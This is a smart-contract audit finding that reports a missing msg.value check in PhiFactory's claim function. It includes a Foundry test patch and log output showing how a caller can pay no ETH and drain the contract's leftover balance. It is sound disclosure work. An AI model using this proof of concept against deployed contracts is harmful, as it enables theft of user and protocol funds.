## [M] `PhiFactory:claim` potentially causing loss of funds if `mintFee` changed beforehand

If the `mintFee` was lowered by the Art creator via `updateArtSettings` before the `claim` was executed, the `msg.value` from user would become larger than the updated value of `mintFee`. As the function does not validate `msg.value` and consumes the `mintFee` directly, the excess ETH sent by the user will not be refunded, causing a loss of funds for user.

If `PhiFactory` still holds positive ETH balance, a malicious user can exploit this by sending less `msg.value` than expected (or no ETH at all). This results in `PhiFactory`'s ETH being used for the `mintFee` payment instead, causing a loss for the protocol.

### Proof of Concept

This external call to `this.merkleClaim` forwards the `mintFee` value of ETH without validating it against `msg.value`.

- Found in [src/PhiFactory.sol at Line 283](relative_path_091409:src/PhiFactory.sol#L283)

    ```solidity
    264:    function claim(bytes calldata encodeData_) external payable {
        ...
    282:            uint256 mintFee = getArtMintFee(artId, quantity_);
    283: =>             this.merkleClaim{ value: mintFee }(proof, claimData, mintArgs, leafPart_); 
    284:        } else if (art.verificationType.eq("SIGNATURE")) {
        ...
    304:    }
    ```

Similarly, this external call to `this.signatureClaim` forwards the `mintFee` value of ETH without validating it against `msg.value`.

- Found in [src/PhiFactory.sol at Line 300](relative_path_091409:src/PhiFactory.sol#L300)

    ```solidity
    264:    function claim(bytes calldata encodeData_) external payable {
        ...
    299:            uint256 mintFee = getArtMintFee(artId, quantity_);
    300: =>             this.signatureClaim{ value: mintFee }(signature_, claimData, mintArgs);
    301:        } else {
        ...
    304:    }
    ```

Although the `merkleClaim` and `signatureClaim` functions can process refunds, the `claim` function calls of these two functions `externally` (defined as `external` instead of `public`), results in the `msg.value` being overridden by the `mintFee`. As a result, the original `msg.value` sent to `claim()` remains unvalidated and become vulnerable to exploits.

### POC

Apply patch & run `forge test -vvv --mt test_claim_exploit`:

```patch
diff --git a/test/PhiFactory.t.sol b/test/PhiFactory.t.sol
index f999052..3b6853d 100644
--- a/test/PhiFactory.t.sol
+++ b/test/PhiFactory.t.sol
@@ -300,4 +300,43 @@ contract TestPhiFactory is Settings {
         assertEq(newRoyaltyReceiver, checkRoyaltyConfig.royaltyRecipient, "royalty receiver should be updated");
         assertEq(500, checkRoyaltyConfig.royaltyBPS, "royalty bps should be updated");
     }
+
+    function test_claim_exploit() public {
+        _createArt(ART_ID_URL_STRING); // artID 1
+        _createArt(ART_ID_URL_STRING); // artID 2
+
+        bytes[2] memory dataCompressed;
+
+        for (uint i = 0; i < dataCompressed.length; i++) {
+            bytes32 advanced_data = bytes32("1");
+            uint256 artId = i + 1;
+            bytes memory signData =
+                abi.encode(expiresIn, participant, referrer, verifier, artId, block.chainid, advanced_data);
+            bytes32 msgHash = keccak256(signData);
+            bytes32 digest = ECDSA.toEthSignedMessageHash(msgHash);
+            (uint8 v, bytes32 r, bytes32 s) = vm.sign(claimSignerPrivateKey, digest);
+            if (v != 27) s = s | bytes32(uint256(1) << 255);
+            bytes memory signature = abi.encodePacked(r, s);
+            bytes memory data =
+                abi.encode(artId, participant, referrer, verifier, expiresIn, uint256(1), advanced_data, IMAGE_URL, signature);
+            dataCompressed[i] = LibZip.cdCompress(data);
+        }
+
+        vm.startPrank(participant, participant);
+
+        // @audit claim artId 1 with extra 0.1 ETH to simulate the mintFee has been lowered right before
+        uint256 totalMintFee = phiFactory.getArtMintFee(1, 1);
+        phiFactory.claim{ value: totalMintFee + 0.1 ether }(dataCompressed[0]);
+        uint256 phiFactoryBalance1 = address(phiFactory).balance;
+        assertEq(phiFactoryBalance1, 0.1 ether, "balance is empty");
+        console2.log("phiFactory has extra %d after claim artId 1", phiFactoryBalance1);
+
+        // @audit claim artId 2 to exploit phiFactory balance since it has extra 0.1 ether
+        totalMintFee = phiFactory.getArtMintFee(2, 1);
+        phiFactory.claim{ value: 0 }(dataCompressed[1]); // 0 ETH was used
+        uint256 phiFactoryBalance2 = address(phiFactory).balance;
+        assertEq(phiFactoryBalance2, phiFactoryBalance1 - totalMintFee, "phiFactory balance not exploited");
+        console2.log("phiFactory after claim artId 2", phiFactoryBalance2);
+        console2.log("phiFactory loss %d after claim artId 2", phiFactoryBalance1 - phiFactoryBalance2);
+    }
 }
```

Result:

```sh
forge test -vvv --mt test_claim_exploit

Ran 1 test for test/PhiFactory.t.sol:TestPhiFactory
[PASS] test_claim_exploit() (gas: 2103923)
Logs:
  phiFactory has extra 100000000000000000 after claim artId 1
  phiFactory after claim artId 2 89550000000000000
  phiFactory loss 10450000000000000 after claim artId 2

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 4.78ms (1.92ms CPU time)
```

This confirms both cases where `msg.value > mintFee` and `msg.value = 0` could be exploited, causing loss of funds for both users and the protocol.



